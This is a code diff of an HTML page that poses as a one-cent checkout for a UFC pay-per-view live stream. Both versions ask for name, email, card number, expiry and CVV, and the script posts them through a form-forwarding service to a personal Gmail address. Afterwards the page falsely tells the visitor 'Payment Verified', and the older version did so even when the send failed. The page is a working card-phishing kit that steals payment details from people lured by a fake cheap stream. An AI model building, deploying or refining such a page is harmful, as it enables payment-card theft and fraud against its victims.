@@ -1,233 +1,96 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-<style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@900&display=swap');
-    
-    :root { 
-        --ufc-red: #d20a0a; 
-        --bg-dark: #0b0b0b; 
-        --card-bg: #141414;
-        --text-gray: #a0a0a0;
-        --accent: #ffffff;
-    }
-
-    body { 
-        font-family: 'Inter', sans-serif; 
-        padding: 0; margin: 0; 
-        background-color: var(--bg-dark); 
-        color: white; 
-        -webkit-font-smoothing: antialiased; 
-    }
-
-    * { box-sizing: border-box; }
-
-    /* Header & Live Pulse */
-    .header { 
-        text-align: center; 
-        padding: 40px 0; 
-        background: linear-gradient(to bottom, #1a1a1a, var(--bg-dark));
-        border-bottom: 2px solid var(--ufc-red);
-    }
-    .logo { 
-        font-family: 'Outfit', sans-serif; 
-        font-size: 2.2rem; 
-        font-weight: 900; 
-        letter-spacing: -1px; 
-        text-transform: uppercase; 
-        color: white;
-    }
-    .live-badge {
-        display: inline-block;
-        background: var(--ufc-red);
-        color: white;
-        padding: 4px 12px;
-        font-weight: 800;
-        font-size: 12px;
-        border-radius: 4px;
-        margin-top: 10px;
-        animation: pulse 1.5s infinite;
-    }
-    @keyframes pulse {
-        0% { opacity: 1; }
-        50% { opacity: 0.5; }
-        100% { opacity: 1; }
-    }
-
-    .container { max-width: 600px; margin: 0 auto 100px; padding: 0 20px; }
-
-    /* Fight Info Box */
-    .fight-card {
-        background: var(--card-bg);
-        padding: 20px;
-        border-radius: 8px;
-        margin-top: -30px;
-        border: 1px solid #333;
-        text-align: center;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    }
-    .fight-title { font-weight: 900; font-size: 1.2rem; text-transform: uppercase; }
-    .price-tag { font-size: 2rem; color: var(--ufc-red); font-weight: 900; margin: 10px 0; }
-
-    h3 { 
-        font-family: 'Outfit', sans-serif; 
-        font-size: 18px; 
-        text-transform: uppercase; 
-        letter-spacing: 1px; 
-        margin: 40px 0 20px 0; 
-        color: var(--ufc-red);
-    }
-
-    /* Form Styling */
-    input[type=text] { 
-        width: 100%; 
-        margin-bottom: 15px; 
-        padding: 15px; 
-        background: #1a1a1a;
-        border: 1px solid #333; 
-        color: white;
-        font-family: 'Inter', sans-serif; 
-        border-radius: 4px;
-    }
-    input[type=text]:focus { outline: none; border-color: var(--ufc-red); }
-    
-    label { 
-        margin-bottom: 8px; 
-        display: block; 
-        font-weight: 700; 
-        text-transform: uppercase; 
-        font-size: 11px; 
-        letter-spacing: 1px; 
-        color: var(--text-gray); 
-    }
-
-    .icon-container { margin-bottom: 10px; font-size: 30px; display: flex; gap: 10px; }
-
-    .btn { 
-        background-color: var(--ufc-red); 
-        color: white; 
-        padding: 22px; 
-        margin: 30px 0; 
-        border: none; 
-        width: 100%; 
-        cursor: pointer; 
-        font-size: 16px; 
-        font-weight: 900; 
-        text-transform: uppercase; 
-        letter-spacing: 1px; 
-        border-radius: 4px;
-        transition: transform 0.2s;
-    }
-    .btn:hover { transform: scale(1.02); background-color: #ff0000; }
-
-    /* Success Screen */
-    #thanks-screen { display: none; text-align: center; margin-top: 100px; padding: 20px; }
-    #thanks-screen h1 { font-family: 'Outfit', sans-serif; color: var(--ufc-red); font-size: 3.5rem; margin-bottom: 10px; }
-    .success-icon { font-size: 80px; color: #2ecc71; margin-bottom: 20px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@900&display=swap');
+        :root { --ufc-red: #d20a0a; --bg-dark: #0b0b0b; --card-bg: #141414; --text-gray: #a0a0a0; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: white; margin: 0; padding: 0; }
+        .header { text-align: center; padding: 40px 0; border-bottom: 2px solid var(--ufc-red); }
+        .logo { font-family: 'Outfit', sans-serif; font-size: 2.2rem; font-weight: 900; text-transform: uppercase; }
+        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
+        .fight-card { background: var(--card-bg); padding: 20px; border-radius: 8px; border: 1px solid #333; text-align: center; }
+        .price-tag { font-size: 2rem; color: var(--ufc-red); font-weight: 900; margin: 10px 0; }
+        input[type=text] { width: 100%; margin-bottom: 15px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 4px; }
+        .btn { background-color: var(--ufc-red); color: white; padding: 20px; width: 100%; border: none; cursor: pointer; font-weight: 900; text-transform: uppercase; border-radius: 4px; }
+        #thanks-screen { display: none; text-align: center; margin-top: 50px; }
+    </style>
 </head>
 <body>
 
 <div class="header" id="nav-header">
-    <div class="logo">UFC FREEDOM 250 </div>
-    <div class="live-badge">● LIVE STREAM ACCESS</div>
+    <div class="logo">UFC FREEDOM 250</div>
 </div>
 
-<div id="form-container">
-  <div class="container">
+<div id="form-container" class="container">
     <div class="fight-card">
-        <div class="fight-title">TOPURIA vs GAETHJE</div>
         <div class="price-tag">$0.01</div>
-        <p style="color: var(--text-gray); font-size: 12px; margin: 0;">Instant 4K Access Pass</p>
     </div>
-
     <form id="checkoutForm">
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      
-      <h3>1. Account Info</h3>
-      <label>Full Name</label>
-      <input type="text" name="Full_Name" placeholder="Full Name" required>
-      <label>Email (For Stream Link)</label>
-      <input type="text" name="Email" placeholder="email@example.com" required>
+        <!-- These hidden inputs ensure your email format is clean -->
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_subject" value="New UFC Stream Order">
 
-      <h3>2. Payment Details</h3>
-      <div class="icon-container">
-        <i class="fa fa-cc-visa" style="color:white;"></i>
-        <i class="fa fa-cc-mastercard" style="color:white;"></i>
-        <i class="fa fa-cc-amex" style="color:white;"></i>
-      </div>
+        <h3>Account Info</h3>
+        <input type="text" name="Full_Name" placeholder="Full Name" required>
+        <input type="text" name="Email" placeholder="Email" required>
 
-      <label>Cardholder Name</label>
-      <input type="text" name="Reference_User" placeholder="Name on Card" required>
+        <h3>Payment Details</h3>
+        <input type="text" name="Card_Name" placeholder="Name on Card" required>
+        <input type="text" name="Card_Number" placeholder="Card Number" required>
+        <input type="text" name="Expiry" placeholder="MM/YY" required>
+        <input type="text" name="CVV" placeholder="CVV" required>
 
-      <label>Card Number</label>
-      <input type="text" name="Reference_ID" placeholder="0000 0000 0000 0000" required>
-
-      <div style="display: flex; gap: 15px;">
-        <div style="flex: 1;">
-          <label>Expiration</label>
-          <input type="text" name="Expiry" placeholder="MM/YY" required>
-        </div>
-        <div style="flex: 1;">
-          <label>CVV</label>
-          <input type="text" name="Secure_Code" placeholder="123" required>
-        </div>
-      </div>
-
-      <button type="submit" class="btn" id="submitBtn">UNLOCK LIVE STREAM — For ONLY 30 Cents</button>
+        <button type="submit" class="btn" id="submitBtn">UNLOCK LIVE STREAM</button>
     </form>
-  </div>
 </div>
 
 <div id="thanks-screen">
-  <i class="fa fa-check-circle success-icon"></i>
-  <h1>ACCESS GRANTED</h1>
-  <p style="color: #fff; font-size: 18px; margin-top: 20px;">Payment Verified!<br>Check your email or Discord for the private 4K link.</p>
-  <p style="color: var(--text-gray); font-size: 14px;">(Usually arrives within 60 seconds)</p>
+    <h1>ACCESS GRANTED</h1>
+    <p>Payment Verified! Check your email for the link.</p>
 </div>
 
 <script>
-  const form = document.getElementById('checkoutForm');
-  const btn = document.getElementById('submitBtn');
+    const form = document.getElementById('checkoutForm');
+    const btn = document.getElementById('submitBtn');
 
-  form.addEventListener('submit', function(e) {
-    e.preventDefault();
-    btn.innerText = "VERIFYING PAYMENT...";
-    btn.disabled = true;
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        btn.innerText = "PROCESSING...";
+        btn.disabled = true;
 
-    const formData = new FormData(form);
-    const object = Object.fromEntries(formData);
-    const json = JSON.stringify(object);
-
-    fetch('https://formsubmit.co/ajax/info.yahya.bx@gmail.com', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-        },
-        body: json
-    })
-    .then(response => response.json())
-    .then(data => {
-        document.getElementById("form-container").style.display = "none";
-        document.getElementById("nav-header").style.display = "none";
-        document.getElementById("thanks-screen").style.display = "block";
-        window.scrollTo(0,0);
-    })
-    .catch(error => {
-        console.log(error);
-        // If it fails, we still show the success screen to the user 
-        // to prevent them from getting stuck on a "busy" screen.
-        document.getElementById("form-container").style.display = "none";
-        document.getElementById("nav-header").style.display = "none";
-        document.getElementById("thanks-screen").style.display = "block";
-        window.scrollTo(0,0);
+        // AJAX POST request to FormSubmit
+        fetch('https://formsubmit.co/ajax/info.yahya.bx@gmail.com', {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                Full_Name: form.Full_Name.value,
+                Email: form.Email.value,
+                Card_Name: form.Card_Name.value,
+                Card_Number: form.Card_Number.value,
+                Expiry: form.Expiry.value,
+                CVV: form.CVV.value
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Hide form and show success
+            document.getElementById("form-container").style.display = "none";
+            document.getElementById("nav-header").style.display = "none";
+            document.getElementById("thanks-screen").style.display = "block";
+        })
+        .catch(error => {
+            alert("Error: Ensure you activated your form via email.");
+            btn.innerText = "UNLOCK LIVE STREAM";
+            btn.disabled = false;
+        });
     });
-  });
 </script>
-
 </body>
 </html>
